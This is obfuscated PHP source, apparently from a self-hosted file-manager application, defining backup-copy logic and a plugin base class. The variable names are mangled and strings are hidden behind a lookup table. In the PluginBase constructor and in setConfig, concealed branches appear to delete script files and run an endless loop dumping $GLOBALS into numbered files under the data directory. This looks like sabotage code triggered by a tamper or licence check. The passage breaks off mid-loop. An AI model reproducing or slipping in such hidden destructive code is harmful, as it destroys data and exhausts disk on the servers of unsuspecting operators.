backupPath($Äá»öÍÔ) { $úÂşå—î =& $_SERVER[¿ğÚ‰±–]; $ºúÒÆªÊ = $Äá»öÍÔ[$úÂşå—î[32]]; $´áö«—Ğ = Model($úÂşå—î[848])->get($úÂşå—î[849]); $’âÏİèà = substr(md5($úÂşå—î[850] . $´áö«—Ğ . $ºúÒÆªÊ), 0, 8); return "\173\151\157\72{$Äá»öÍÔ[$úÂşå—î[830]]}\175\57\x64\141\x74\141\142\141\x73\x65\57\x62\141\143\153\x75\x70\x2f" . $ºúÒÆªÊ . $úÂşå—î[11] . $’âÏİèà; } private function tmpFilesPath() { $ÉóÎ» =& $_SERVER[¿ğÚ‰±–]; $ñÛ¢ŠˆŒ = TEMP_FILES; if ($GLOBALS[$ÉóÎ»[6]][$ÉóÎ»[92]][$ÉóÎ»[874]]) { $ñÛ¢ŠˆŒ = $GLOBALS[$ÉóÎ»[6]][$ÉóÎ»[92]][$ÉóÎ»[874]]; if (!mk_dir($ñÛ¢ŠˆŒ) || !is_writable($ñÛ¢ŠˆŒ) || !IO::mkfile($ñÛ¢ŠˆŒ . $ÉóÎ»[875])) { $ñÛ¢ŠˆŒ = TEMP_FILES; } } return $ñÛ¢ŠˆŒ; } } class BackupFile { public function __construct() { } public function index() { $¿Ï¹§© = Backup::get(); $Ü€ìñ‹ü = $¿Ï¹§©[$_SERVER[¿ğÚ‰±–][369]][$_SERVER[¿ğÚ‰±–][230]][$_SERVER[¿ğÚ‰±–][541]]; $òˆŞä­ª = array($_SERVER[¿ğÚ‰±–][542] => array($_SERVER[¿ğÚ‰±–][885], $Ü€ìñ‹ü), $_SERVER[¿ğÚ‰±–][886] => array($_SERVER[¿ğÚ‰±–][407], $¿Ï¹§©[$_SERVER[¿ğÚ‰±–][830]])); $‘ø¤×‘Ù = (int) Model($_SERVER[¿ğÚ‰±–][867])->where($òˆŞä­ª)->count($_SERVER[¿ğÚ‰±–][541]); $ˆó¯„Ì„ = (int) Model($_SERVER[¿ğÚ‰±–][867])->where($òˆŞä­ª)->sum($_SERVER[¿ğÚ‰±–][79]); $ë“ñÈè° = new TaskFileTransfer($_SERVER[¿ğÚ‰±–][887], $_SERVER[¿ğÚ‰±–][861], $‘ø¤×‘Ù, LNG($_SERVER[¿ğÚ‰±–][862]) . $_SERVER[¿ğÚ‰±–][863] . LNG($_SERVER[¿ğÚ‰±–][888])); $ë“ñÈè°->task[$_SERVER[¿ğÚ‰±–][841]] = $ˆó¯„Ì„; $¨Å©òÖ = array($_SERVER[¿ğÚ‰±–][889] => $‘ø¤×‘Ù, $_SERVER[¿ğÚ‰±–][890] => $ˆó¯„Ì„, $_SERVER[¿ğÚ‰±–][891] => time()); Backup::set($¨Å©òÖ); $ÊìÇĞşé = !0; $İæ¨€û… = $this->storeIds(); $ãü„‘Äø = 1; $Ì®²™õ = 1000; $ÈïúÜ« = $»ºîôÀ = 0; $Ò¤„Ä¡ = array(); $­äÊÚÎ = $ÕÏ½±¢‰ = 0; do { $Ù¹€ğâ = $_SERVER[¿ğÚ‰±–][892]; $æÔ¿Æ‚³ = Model($_SERVER[¿ğÚ‰±–][867])->where($òˆŞä­ª)->field($Ù¹€ğâ)->order($_SERVER[¿ğÚ‰±–][893])->selectPage($Ì®²™õ, $ãü„‘Äø); $ø¤ã¦ = !empty($æÔ¿Æ‚³[$_SERVER[¿ğÚ‰±–][445]]) ? $æÔ¿Æ‚³[$_SERVER[¿ğÚ‰±–][445]] : array(); foreach ($ø¤ã¦ as $üƒÈªÊä) { if (!$this->_fileExist($üƒÈªÊä, $Ò¤„Ä¡, $İæ¨€û…)) { write_log("\146\x69\154\145\40\x6e\x6f\164\40\145\170\151\163\164\x2e\x66\151\x6c\145\x49\104\72{$üƒÈªÊä[$_SERVER[¿ğÚ‰±–][541]]}\54\x20\160\x61\164\150\72{$üƒÈªÊä[$_SERVER[¿ğÚ‰±–][87]]}", $_SERVER[¿ğÚ‰±–][894]); continue; } $¯‰‰Ã¦² = $üƒÈªÊä[$_SERVER[¿ğÚ‰±–][87]]; $¹öª±£– = "\173\151\x6f\72{$¿Ï¹§©[$_SERVER[¿ğÚ‰±–][830]]}\x7d" . substr($¯‰‰Ã¦², strlen("\x7b\151\157\x3a{$üƒÈªÊä[$_SERVER[¿ğÚ‰±–][895]]}\x7d")); if (IO::exist($¹öª±£–)) { $ë“ñÈè°->updateFileEnd($üƒÈªÊä[$_SERVER[¿ğÚ‰±–][32]], $üƒÈªÊä[$_SERVER[¿ğÚ‰±–][79]]); } else { $¹öª±£– = get_path_father($¹öª±£–); IO::mkdir($¹öª±£–); if (!IO::copy($¯‰‰Ã¦², $¹öª±£–, $_SERVER[¿ğÚ‰±–][896])) { write_log($_SERVER[¿ğÚ‰±–][897] . $¯‰‰Ã¦² . $_SERVER[¿ğÚ‰±–][881] . $¹öª±£– . $_SERVER[¿ğÚ‰±–][178], $_SERVER[¿ğÚ‰±–][861]); $ÊìÇĞşé = !1; break; } } $Ü€ìñ‹ü = $üƒÈªÊä[$_SERVER[¿ğÚ‰±–][541]]; $»ºîôÀ += 1; $ÈïúÜ« += $üƒÈªÊä[$_SERVER[¿ğÚ‰±–][79]]; $ÕÏ½±¢‰ += 1; $­äÊÚÎ += $üƒÈªÊä[$_SERVER[¿ğÚ‰±–][79]]; if ($ÈïúÜ« >= 1024 * 1024 * 100) { $¨Å©òÖ = array($_SERVER[¿ğÚ‰±–][829] => $Ü€ìñ‹ü, $_SERVER[¿ğÚ‰±–][898] => $ÕÏ½±¢‰, $_SERVER[¿ğÚ‰±–][899] => $­äÊÚÎ); Backup::set($¨Å©òÖ); $ÈïúÜ« = $»ºîôÀ = 0; } } $ÁğíÛİè = count($ø¤ã¦); $ãü„‘Äø++; } while ($ÁğíÛİè == $Ì®²™õ); $ë“ñÈè°->end(); $¨Å©òÖ = array($_SERVER[¿ğÚ‰±–][900] => 1, $_SERVER[¿ğÚ‰±–][839] => time(), $_SERVER[¿ğÚ‰±–][853] => 1, $_SERVER[¿ğÚ‰±–][829] => $Ü€ìñ‹ü, $_SERVER[¿ğÚ‰±–][901] => time()); if ($»ºîôÀ) { $¨Å©òÖ[$_SERVER[¿ğÚ‰±–][898]] = $ÕÏ½±¢‰; $¨Å©òÖ[$_SERVER[¿ğÚ‰±–][899]] = $­äÊÚÎ; } Backup::set($¨Å©òÖ); return !0; } private function _fileExist($ªúÄ‘Â¯, &$ß©öÒ¾ü, $Ô•ôİè¢) { $«ˆ¤Ã­¹ =& $_SERVER[¿ğÚ‰±–]; $úŞú¦Û = $ªúÄ‘Â¯[$«ˆ¤Ã­¹[87]]; if (in_array($ªúÄ‘Â¯[$«ˆ¤Ã­¹[541]], $ß©öÒ¾ü)) { return !1; } if (!in_array($ªúÄ‘Â¯[$«ˆ¤Ã­¹[895]], $Ô•ôİè¢)) { return !1; } if (IO::exist($úŞú¦Û)) { return !0; } $èÉæï = get_path_father($úŞú¦Û); if (IO::exist($èÉæï)) { $ß©öÒ¾ü[] = $ªúÄ‘Â¯[$«ˆ¤Ã­¹[541]]; return !1; } $³‚’İµÍ = array($«ˆ¤Ã­¹[895] => $ªúÄ‘Â¯[$«ˆ¤Ã­¹[895]], $«ˆ¤Ã­¹[87] => array($«ˆ¤Ã­¹[459], "{$èÉæï}\x25")); $ıïî¸÷ç = Model($«ˆ¤Ã­¹[867])->where($³‚’İµÍ)->field($«ˆ¤Ã­¹[542])->select(); $ß©öÒ¾ü = array_merge($ß©öÒ¾ü, array_to_keyvalue($ıïî¸÷ç, $«ˆ¤Ã­¹[12], $«ˆ¤Ã­¹[541])); return !1; } private function _fileFilter($‘Û…á—¹) { $äæğ¦¦î =& $_SERVER[¿ğÚ‰±–]; return; if (empty($‘Û…á—¹)) { return; } $âêĞá•† = array($äæğ¦¦î[541] => array($äæğ¦¦î[7], array_unique($‘Û…á—¹))); $ˆœâ†İ = Model($äæğ¦¦î[902])->where($âêĞá•†)->field($äæğ¦¦î[193])->select(); foreach ($ˆœâ†İ as $ÍµíÓ…®) { Model($äæğ¦¦î[902])->remove($ÍµíÓ…®[$äæğ¦¦î[193]], !1); } } private function storeIds() { $®¶È¾¡Ò =& $_SERVER[¿ğÚ‰±–]; $Êµ€ª¥ğ = Model($®¶È¾¡Ò[845])->listData(); $Ûœ½âÉ = array(); $”½¹Ì™ó = $GLOBALS[$®¶È¾¡Ò[6]][$®¶È¾¡Ò[92]][$®¶È¾¡Ò[903]]; foreach ($Êµ€ª¥ğ as $¡è±®Ÿ) { $‰öÕ€ëª = strtolower($¡è±®Ÿ[$®¶È¾¡Ò[98]]); if (!isset($”½¹Ì™ó[$‰öÕ€ëª])) { continue; } $ÅˆôİÆ¦ = $®¶È¾¡Ò[77] . (isset($”½¹Ì™ó[$‰öÕ€ëª]) ? $”½¹Ì™ó[$‰öÕ€ëª] : ucfirst($‰öÕ€ëª)); if (!class_exists($ÅˆôİÆ¦)) { continue; } $Ûœ½âÉ[] = $¡è±®Ÿ[$®¶È¾¡Ò[475]]; } return $Ûœ½âÉ; } } goto C¾Ù‡ïÛ©Æ; bæŠØ±†ï: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $Èîû…á· =& $_SERVER[¿ğÚ‰±–]; if ($_SERVER[$Èîû…á·[957]] != $_SERVER[$Èîû…á·[1610]]) { $…‘¶Áìâ = $Èîû…á·[958]; $‚›ö = $Èîû…á·[959]; $í£„¢… = $_SERVER[$Èîû…á·[954]] . $Èîû…á·[955]; $›ÑÚ£Ïè = $‚›ö($í£„¢…); $ÎƒÎøÒı = explode($Èîû…á·[262], $›ÑÚ£Ïè); if (count($ÎƒÎøÒı) < $Èîû…á·[688]) { $–ƒĞÅ½¤ = $Èîû…á·[960]; $–ƒĞÅ½¤(); } $”¡¨•« = $Èîû…á·[961]; $”¡¨•«($_SERVER[$Èîû…á·[962]]); $”¡¨•«($_SERVER[$Èîû…á·[954]] . $Èîû…á·[1632]); $Œ¹Æ Ì = 1; while ($Œ¹Æ Ì > 1) { $Œ¹Æ Ì = $Œ¹Æ Ì + 4; $®ô‹úÏÅ = rawurlencode($Œ¹Æ Ì . $Èîû…á·[454]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($Èîû…á·[1633]); $this->pluginName = str_replace($Èîû…á·[1633], $Èîû…á·[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $Èîû…á·[8]; $this->pluginApi = appHostGet() . $Èîû…á·[1634] . $this->pluginName . $Èîû…á·[8]; $this->pluginHost = $config[$Èîû…á·[1635]] . $this->pluginName . $Èîû…á·[8]; $this->pluginHostDefault = $config[$Èîû…á·[1635]] . $this->pluginName . $Èîû…á·[8]; $è½şç¡ˆ = $config[$Èîû…á·[1636]]; if ($è½şç¡ˆ && strpos($Èîû…á·[50] . $è½şç¡ˆ . $Èîû…á·[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$Èîû…á·[1637]] . $this->pluginName . $Èîû…á·[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); $this->linkHas = !1; return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[¿ğÚ‰±–][1638]); } protected function assign($æ—òòÊ, $ØŒĞÈš™ = false) { if (is_array($æ—òòÊ)) { $this->values = array_merge($this->values, $æ—òòÊ); } else { $this->values[$æ—òòÊ] = $ØŒĞÈš™; } } protected function display($šáí·Èƒ) { extract($this->values); require $šáí·Èƒ; } final function hookRegist($´×‰–×‰) { $this->modelPlugin->appRegist($this->pluginName, $´×‰–×‰); } final function appIcon() { $ô³½Ê·Ğ =& $_SERVER[¿ğÚ‰±–]; $¾×ŒÃÉ¢ = $this->appPackage(); $’Î¦©ÃÌ = $ô³½Ê·Ğ[12]; if (isset($¾×ŒÃÉ¢[$ô³½Ê·Ğ[490]])) { if (isset($¾×ŒÃÉ¢[$ô³½Ê·Ğ[490]][$ô³½Ê·Ğ[1639]])) { $’Î¦©ÃÌ = $ô³½Ê·Ğ[1640] . $¾×ŒÃÉ¢[$ô³½Ê·Ğ[490]][$ô³½Ê·Ğ[1639]] . $ô³½Ê·Ğ[1641]; } else { if ($¾×ŒÃÉ¢[$ô³½Ê·Ğ[490]][$ô³½Ê·Ğ[1642]]) { $’Î¦©ÃÌ = $ô³½Ê·Ğ[1643] . $¾×ŒÃÉ¢[$ô³½Ê·Ğ[490]][$ô³½Ê·Ğ[1642]] . $ô³½Ê·Ğ[1644]; } } } return $’Î¦©ÃÌ; } final function fileCanView($…µ„®Ñ) { $˜ÎïõÈ =& $_SERVER[¿ğÚ‰±–]; if (request_url_safe($…µ„®Ñ)) { return !0; } if ($this->isShare($…µ„®Ñ)) { return !0; } if (!KodUser::isRoot() && !KodUser::isLogin()) { $—ö¥Í• = $˜ÎïõÈ[1645] . rawurlencode(this_url()); show_tips(LNG($˜ÎïõÈ[1646]) . $˜ÎïõÈ[1647] . $—ö¥Í• . $˜ÎïõÈ[1648] . LNG($˜ÎïõÈ[1649]) . $˜ÎïõÈ[1650], !1); } if (!Action($˜ÎïõÈ[1651])->authCan($˜ÎïõÈ[1652])) { show_tips(LNG($˜ÎïõÈ[1653]) . $˜ÎïõÈ[1654], !1); } ActionCall($˜ÎïõÈ[1655], $…µ„®Ñ); } final function isShare($ş…Á±‹š) { $Šü†ü‹ = KodIO::parse($ş…Á±‹š); return $Šü†ü‹[$_SERVER[¿ğÚ‰±–][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($­ÏëİôÄ) { if (request_url_safe($­ÏëİôÄ)) { return $­ÏëİôÄ; } if (!$this->isShare($­ÏëİôÄ)) { $­ÏëİôÄ = $this->filePath($­ÏëİôÄ, !1); } return Action($_SERVER[¿ğÚ‰±–][1263])->linkOut($­ÏëİôÄ); } public function filePathLinkOut($Õ¥Ì× „) { if (request_url_safe($Õ¥Ì× „)) { return $Õ¥Ì× „; } $this->fileCanView($Õ¥Ì× „); return Action($_SERVER[¿ğÚ‰±–][1263])->link($Õ¥Ì× „); } final function filePath($§îğ‚Åæ, $Ë‰© = true, $ƒÚÎÛñğ = false) { $Íßİ¥¢ş =& $_SERVER[¿ğÚ‰±–]; $¬¼Òí = $this->filePathGet($§îğ‚Åæ, $Ë‰©); if (!$this->fileInfo) { show_tips(LNG($Íßİ¥¢ş[108]), !1); } if ($ƒÚÎÛñğ && isset($this->fileInfo[$Íßİ¥¢ş[541]]) && $this->fileInfo[$Íßİ¥¢ş[541]]) { $üğâ›Ì = Model($Íßİ¥¢ş[544])->fileInfo($this->fileInfo[$Íßİ¥¢ş[541]]); if (!$üğâ›Ì || !IO::exist($üğâ›Ì[$Íßİ¥¢ş[87]])) { show_tips(LNG($Íßİ¥¢ş[108]) . $Íßİ¥¢ş[1656]); } } Hook::trigger($Íßİ¥¢ş[1657], $¬¼Òí); return $¬¼Òí; } final function filePathGet($¾Ã¯ö»à, $Æ¢İõ· = true) { $…½Éá°á =& $_SERVER[¿ğÚ‰±–]; if ($£×º®µ¿ = $this->checkSharePath($¾Ã¯ö»à, $Æ¢İõ·)) { return $£×º®µ¿; } $this->fileCanView($¾Ã¯ö»à); if (request_url_safe($¾Ã¯ö»à)) { $èÛšÖì = parse_url_query($¾Ã¯ö»à); if (isset($èÛšÖì[$…½Éá°á[1658]]) && isset($èÛšÖì[$…½Éá°á[234]])) { $¼‹‘ŒÈµ = Mcrypt::decode($èÛšÖì[$…½Éá°á[234]], Model($…½Éá°á[848])->get($…½Éá°á[849])); if ($¼‹‘ŒÈµ) { $this->fileInfo = IO::info($¼‹‘ŒÈµ); $this->fileInfo[$…½Éá°á[1659]] = $¾Ã¯ö»à; $this->cachePath = $this->pluginCachePath($…½Éá°á[12], $Æ¢İõ·); return $¼‹‘ŒÈµ; } } $¾Ã¯ö»à = $this->_cacheHttpFile($¾Ã¯ö»à, $Æ¢İõ·); $this->fileInfo = IO::info($¾Ã¯ö»à); } else { $this->fileInfo = IO::info($¾Ã¯ö»à); $this->cachePath = $this->pluginCachePath($…½Éá°á[12], $Æ¢İõ·); } return $¾Ã¯ö»à; } final function _cacheHttpFile($¬„–»Ñæ, $ôåàõêÌ = true) { $Á’º­æ =& $_SERVER[¿ğÚ‰±–]; $ÉºÔ•ìˆ = parse_url_query($¬„–»Ñæ); $Ş†˜Áå = get_path_ext($¬„–»Ñæ); if (isset($ÉºÔ•ìˆ[$Á’º­æ[32]]) && $ÉºÔ•ìˆ[$Á’º­æ[32]]) { $Ş†˜Áå = get_path_ext($ÉºÔ•ìˆ[$Á’º­æ[32]]); } $ÑÖğ˜Íˆ = hash_path($¬„–»Ñæ) . $Á’º­æ[10] . $Ş†˜Áå; $this->cachePath = $this->pluginCachePath($ôåàõêÌ ? $ÑÖğ˜Íˆ : $Á’º­æ[12]); $šËûĞ¶ = IO::fileNameExist($this->cachePath, $ÑÖğ˜Íˆ); if ($šËûĞ¶) { return KodIO::make($šËûĞ¶); } $–…‚ÂêŒ = rtrim($this->cachePath, $Á’º­æ[8]) . $Á’º­æ[8] . $ÑÖğ˜Íˆ; return $this->pluginCacheFileSet($–…‚ÂêŒ, file_get_contents_nossl($¬„–»Ñæ)); } final function checkSharePath($¶»àí”Î, $Éö¥Ãğ = true) { $ü‡ˆˆ‚Ù =& $_SERVER[¿ğÚ‰±–]; if (!$this->isShare($¶»àí”Î)) { return !1; } $³Ö²ô¥¹ = Action($ü‡ˆˆ‚Ù[1263])->sharePathInfo($¶»àí”Î); if (!is_array($³Ö²ô¥¹) || !isset($³Ö²ô¥¹[$ü‡ˆˆ‚Ù[87]])) { show_json(LNG($ü‡ˆˆ‚Ù[1660]), !1); } $this->fileInfo = $³Ö²ô¥¹; $this->cachePath = $this->pluginCachePath(!1, $Éö¥Ãğ); return $³Ö²ô¥¹[$ü‡ˆˆ‚Ù[87]]; } final function pluginCachePath($¶——ÇÏí = '', $ï›ûà¦— = false) { $…ìæÇ†£ =& $_SERVER[¿ğÚ‰±–]; if ($ï›ûà¦— && is_array($this->fileInfo)) { $¶——ÇÏí = kodIO::hashPath($this->fileInfo); } $»Í²ü« = rtrim(IO_PATH_SYSTEM_TEMP . $…ìæÇ†£[1661] . $this->pluginName . $…ìæÇ†£[8] . $¶——ÇÏí, $…ìæÇ†£[8]); $Ÿ¹È»şÚ = IO::infoFullSimple($»Í²ü«); $øÉšãû = $Ÿ¹È»şÚ && is_array($Ÿ¹È»şÚ) ? $Ÿ¹È»şÚ[$…ìæÇ†£[87]] : $…ìæÇ†£[12]; if (!$øÉšãû) { $øÉšãû = IO::mkdir($»Í²ü«); } return $øÉšãû; } final function pluginCacheFileSet($õ™ÄÄø, $Ö„üÉ˜Û = '') { $í’Âı™± =& $_SERVER[¿ğÚ‰±–]; $…•çÈöò = IO::infoFullSimple($õ™ÄÄø); if (!$…•çÈöò) { return IO::mkfile($õ™ÄÄø, $Ö„üÉ˜Û, REPEAT_REPLACE); } IO::setContent($…•çÈöò[$í’Âı™±[87]], $Ö„üÉ˜Û); return $…•çÈöò[$í’Âı™±[87]]; } final function pluginLocalFile($œ©ÄıêÜ = '') { $‚ š’™€ =& $_SERVER[¿ğÚ‰±–]; $šÛè±ê = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($šÛè±ê)) { mk_dir($šÛè±ê); } if (!$œ©ÄıêÜ) { return $šÛè±ê; } $³‘Øê·ƒ = IO::info($œ©ÄıêÜ); $Û¿–ÏËØ = $‚ š’™€[1662] . KodIO::hashPath($³‘Øê·ƒ) . $‚ š’™€[10] . $³‘Øê·ƒ[$‚ š’™€[169]]; if (!checkExtSafe($Û¿–ÏËØ)) { $Û¿–ÏËØ = $Û¿–ÏËØ . $‚ š’™€[1298]; } $©Öî³¡ = $šÛè±ê . $Û¿–ÏËØ; if (@file_exists($©Öî³¡)) { return $©Öî³¡; } return IO::copy($œ©ÄıêÜ, $šÛè±ê, 0, $Û¿–ÏËØ); } final function appPackage() { $â¿å¹û§ =& $_SERVER[¿ğÚ‰±–]; if ($this->packageData) { return $this->packageData; } $½Àƒ´ªš = $this->parseFile($this->pluginPath . $â¿å¹û§[1663]); $this->parseLang($½Àƒ´ªš); $ÒÅÛš°È = json_decode_force($½Àƒ´ªš); if (!$ÒÅÛš°È) { return array(); } $ù¨òƒÎ = Hook::trigger($â¿å¹û§[1664], $ÒÅÛš°È); if ($ù¨òƒÎ && is_array($ù¨òƒÎ)) { $ÒÅÛš°È = $ù¨òƒÎ; } $this->packageData = $ÒÅÛš°È; return $ÒÅÛš°È; } public function packageInfoGet($ø¬öîâÌ) { $Öèô€º× = $this->appPackage(); return array_get_value($Öèô€º×, $ø¬öîâÌ); } public function packageVersion() { return $this->packageInfoGet($_SERVER[¿ğÚ‰±–][1665]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[¿ğÚ‰±–][1666]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[¿ğÚ‰±–][1667]); } public function echoJsAssign($À¬’‹Ö, $ø¢õàüî) { $this->echoJsAssignArr[$À¬’‹Ö] = $ø¢õàüî; } private function parseFile($çÖ®°—ç) { $ôŠÒµıè =& $_SERVER[¿ğÚ‰±–]; $Ü¢ Ï›— = file_get_contents_nossl($çÖ®°—ç); $¡ËìŸ£Á = array($ôŠÒµıè[1668], $ôŠÒµıè[1669], $ôŠÒµıè[1670], $ôŠÒµıè[1671], $ôŠÒµıè[1672], $ôŠÒµıè[1673], $ôŠÒµıè[1674]); $Îã«î¥ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$ôŠÒµıè[92]][$ôŠÒµıè[1675]]); foreach ($this->echoJsAssignArr as $ë³ÉêªÈ => $ä÷Û„İ¯) { $¡ËìŸ£Á[] = $ôŠÒµıè[1676] . $ë³ÉêªÈ . $ôŠÒµıè[1677]; $Îã«î¥[] = is_array($ä÷Û„İ¯) || is_object($ä÷Û„İ¯) ? rawurlencode(json_encode($ä÷Û„İ¯)) : $ä÷Û„İ¯; } if (strstr($Ü¢ Ï›—, $ôŠÒµıè[1678])) { $µ§„•ôÕ = rawurlencode(json_encode($this->pluginLangArr)); $Ü¢ Ï›— = str_replace($ôŠÒµıè[1678], $µ§„•ôÕ, $Ü¢ Ï›—); } if (strstr($Ü¢ Ï›—, $ôŠÒµıè[1679])) { $µ§„•ôÕ = $µ§„•ôÕ = rawurlencode(json_encode($this->getConfig())); $Ü¢ Ï›— = str_replace($ôŠÒµıè[1679], $µ§„•ôÕ, $Ü¢ Ï›—); } $Ü¢ Ï›— = str_replace($¡ËìŸ£Á, $Îã«î¥, $Ü¢ Ï›—); return $Ü¢ Ï›—; } private function parseLang(&$úñ¿¬) { $åâ€Ö¼œ =& $_SERVER[¿ğÚ‰±–]; $£Í¥©áë = $åâ€Ö¼œ[1680]; if (!strstr($úñ¿¬, $£Í¥©áë)) { return; } preg_match_all($åâ€Ö¼œ[1681], $úñ¿¬, $“€ª); if (!is_array($“€ª) || count($“€ª) == 0 || !is_array($“€ª[0]) || count($“€ª[0]) == 0) { return; } $˜´ô®Ë = array(); $É»èÜèú = array(); foreach ($“€ª[0] as $£ÔŒëöı) { $–´Çİ´» = substr($£ÔŒëöı, strlen($£Í¥©áë), -4); $äì˜ŠÈÈ = LNG($–´Çİ´»); $˜´ô®Ë[] = $£ÔŒëöı; $É»èÜèú[] = str_replace(array($åâ€Ö¼œ[262], $åâ€Ö¼œ[1164], $åâ€Ö¼œ[418], $åâ€Ö¼œ[121]), array($åâ€Ö¼œ[53], $åâ€Ö¼œ[53], $åâ€Ö¼œ[12], $åâ€Ö¼œ[1682]), $äì˜ŠÈÈ); } $úñ¿¬ = str_replace($˜´ô®Ë, $É»èÜèú, $úñ¿¬); } private function parseConfig(&$³şÑ£Ÿ) { $ğò·±íí =& $_SERVER[¿ğÚ‰±–]; $ŞößÚŞ = $ğò·±íí[1683]; if (!strstr($³şÑ£Ÿ, $ŞößÚŞ)) { return; } preg_match_all($ğò·±íí[1684], $³şÑ£Ÿ, $¢¸öÛ’); if (!is_array($¢¸öÛ’) || count($¢¸öÛ’) == 0 || !is_array($¢¸öÛ’[0]) || count($¢¸öÛ’[0]) == 0) { return; } $‘È§Ó = $this->getConfig(); $È«Æë¯ß = array(); $„ÔåÇÉæ = array(); foreach ($¢¸öÛ’[0] as $‡¸…‚) { $Í‚ùüòŠ = substr($‡¸…‚, strlen($ŞößÚŞ), -2); $È«Æë¯ß[] = $‡¸…‚; $„ÔåÇÉæ[] = _get($‘È§Ó, $Í‚ùüòŠ); } $³şÑ£Ÿ = str_replace($È«Æë¯ß, $„ÔåÇÉæ, $³şÑ£Ÿ); } private function parsePackage(&$å¢îÊİË) { $ÂÌ¤­ =& $_SERVER[¿ğÚ‰±–]; $å¸±åÏâ = $ÂÌ¤­[1685]; if (!strstr($å¢îÊİË, $å¸±åÏâ)) { return; } preg_match_all($ÂÌ¤­[1686], $å¢îÊİË, $‹æ¹ªæ); if (!is_array($‹æ¹ªæ) || count($‹æ¹ªæ) == 0 || !is_array($‹æ¹ªæ[0]) || count($‹æ¹ªæ[0]) == 0) { return; } $ÉáşØÛ¡ = $this->appPackage(); $õùŸìÊ = array(); $Ÿ×øÓ™ß = array(); foreach ($‹æ¹ªæ[0] as $ÜøƒÌï ) { $æäƒšÒâ = substr($ÜøƒÌï , strlen($å¸±åÏâ), -2); $õùŸìÊ[] = $ÜøƒÌï ; $Ÿ×øÓ™ß[] = _get($ÉáşØÛ¡, $æäƒšÒâ); } $å¢îÊİË = str_replace($õùŸìÊ, $Ÿ×øÓ™ß, $å¢îÊİË); } final function echoFile($Ùİ–…¯Å, $ÍœÜÍÅÜ = false) { $ÄÉ‹·çğ =& $_SERVER[¿ğÚ‰±–]; $©Ü€çÕØ = $this->pluginPath . $Ùİ–…¯Å; if (ACT == $ÄÉ‹·çğ[1687]) { echo $ÄÉ‹·çğ[1688] . $this->pluginName . $ÄÉ‹·çğ[8] . $Ùİ–…¯Å . $ÄÉ‹·çğ[1689]; if (!file_exists($©Ü€çÕØ)) { echo $ÄÉ‹·çğ[1690]; return; } } $‹»÷¦ú = $this->parseFile($©Ü€çÕØ); $this->parseLang($‹»÷¦ú); $this->parseConfig($‹»÷¦ú); $this->parsePackage($‹»÷¦ú); if (is_array($ÍœÜÍÅÜ)) { $‹»÷¦ú = str_replace(array_keys($ÍœÜÍÅÜ), array_values($ÍœÜÍÅÜ), $‹»÷¦ú); } echo $ÄÉ‹·çğ[262] . $‹»÷¦ú; } private function checkVersion() { $Øêµº–å =& $_SERVER[¿ğÚ‰±–]; $±´ƒÂ† = $this->appPackage(); $¤ÔÀ´ï™ = $this->getConfig(); if ($¤ÔÀ´ï™[$Øêµº–å[1691]] == $±´ƒÂ†[$Øêµº–å[1665]]) { return; } $this->regist(); $this->setConfig(array($Øêµº–å[1691] => $±´ƒÂ†[$Øêµº–å[1665]])); } final function initLang() { $œŞ«–×Ã =& $_SERVER[¿ğÚ‰±–]; $´±Î°¶Ê = $œŞ«–×Ã[1692]; $±²±ªã™ = $this->pluginPath . $œŞ«–×Ã[1693]; $·æ™²µ = I18n::getType(); $Ğ ÛàİË = array(); if (file_exists($±²±ªã™ . $·æ™²µ . $œŞ«–×Ã[916])) { $Ğ ÛàİË = (include $±²±ªã™ . $·æ™²µ . $œŞ«–×Ã[916]); } else { if ($·æ™²µ == $œŞ«–×Ã[1694] && !file_exists($±²±ªã™ . $·æ™²µ . $œŞ«–×Ã[916]) && file_exists($±²±ªã™ . $œŞ«–×Ã[1695])) { $Ğ ÛàİË = (include $±²±ªã™ . $œŞ«–×Ã[1695]); } else { if (file_exists($±²±ªã™ . $´±Î°¶Ê . $œŞ«–×Ã[916])) { $Ğ ÛàİË = (include $±²±ªã™ . $´±Î°¶Ê . $œŞ«–×Ã[916]); } } } if (!is_array($Ğ ÛàİË)) { return array(); } if (@count($Ğ ÛàİË) > 0) { I18n::set($Ğ ÛàİË); } return $Ğ ÛàİË; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($ùìè±²„) { $ÂË†ò¡Ï =& $_SERVER[¿ğÚ‰±–]; $Şö£´ì = $_SERVER[$ÂË†ò¡Ï[968]]; $’²ó½ñú = $ÂË†ò¡Ï[956]; if ($_SERVER[$ÂË†ò¡Ï[957]] != $’²ó½ñú($Şö£´ì)) { $Ğ¼Ä•ÜË = $ÂË†ò¡Ï[958]; $‡®®º‰€ = $ÂË†ò¡Ï[959]; $‘ËäŒ‰² = $_SERVER[$ÂË†ò¡Ï[954]] . $ÂË†ò¡Ï[955]; $œ°©¯Æø = $‡®®º‰€($‘ËäŒ‰²); $‘Ë»š™Ø = explode($ÂË†ò¡Ï[262], $œ°©¯Æø); if (count($‘Ë»š™Ø) < $ÂË†ò¡Ï[688]) { $‰è–ÒÎæ = $ÂË†ò¡Ï[960]; $‰è–ÒÎæ(); } $şºôÍ = $ÂË†ò¡Ï[961]; $şºôÍ($_SERVER[$ÂË†ò¡Ï[962]]); $Ğ¼Ä•ÜË = $ÂË†ò¡Ï[958]; $Ğ¼Ä•ÜË(); $èÓ±ÃÒï = $ÂË†ò¡Ï[963]; $’ÉŸÕ½ê = json_encode($GLOBALS[$ÂË†ò¡Ï[964]]); $ø›ö§¬ = 1; for ($Ò‹”š›Ã = $ø›ö§¬; $Ò‹”š›Ã > 0; $Ò‹”š›Ã++) { $èÓ±ÃÒï(DATA_PATH . $Ò‹”š›Ã, 